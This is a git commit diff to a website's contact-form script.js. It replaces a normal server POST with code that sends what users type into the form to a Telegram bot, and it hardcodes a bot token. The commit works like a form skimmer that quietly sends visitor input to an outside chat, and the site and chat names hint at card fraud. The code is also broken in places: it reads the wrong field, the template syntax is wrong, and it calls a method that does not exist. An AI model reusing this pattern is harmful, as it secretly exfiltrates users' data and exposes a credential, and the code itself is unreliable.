f19cd9c2a62534d5dc5c88e39a7b99937f5f68c4
fn-static <onlyfanskasia111@gmail.com>
2024-08-12 22:50:49 +0200

    Update script.js

--- onialts.shop/contact-form/script.js
+++ onialts.shop/contact-form/script.js
@@ -1,20 +1,20 @@
-"use strict"
+const form = document.querySelector("#form");
 
-const form = document.querySelector('.form');
-form.addEventListener('submit', function(e) { e.preventDefault(); 
-sendMessage(form);
+form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    var text1 = document.getElementById("text1").value;
+    var text2 = document.getElementById("text1").value;
+
+    var my_text = `Result is:%0A - TEXT1: %{text1} %0A - Text2: ${text2}`
+
+    var token = "7251900025:AAHh-Vz-KACC9cLbabNPfc07XipT9iw34d8";
+    var chat_id = fncardbot
+    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}/`
+
+    let api = new XMLHttpRequest();
+    api.OPENED("GET", url, true);
+    api.send();
+
+    console.log("Message succes")
 })
-
-async function sendMessage(form) {
-    const formData = new FormData(form);
-    if (formData) {
-        const url ='sendmessage.php';
-        const respone = await fetch(url, {
-            method: "POST",
-            body: formData
-        });
-        if (respone.ok) {
-            form.reset();
-        }
-    }
-}
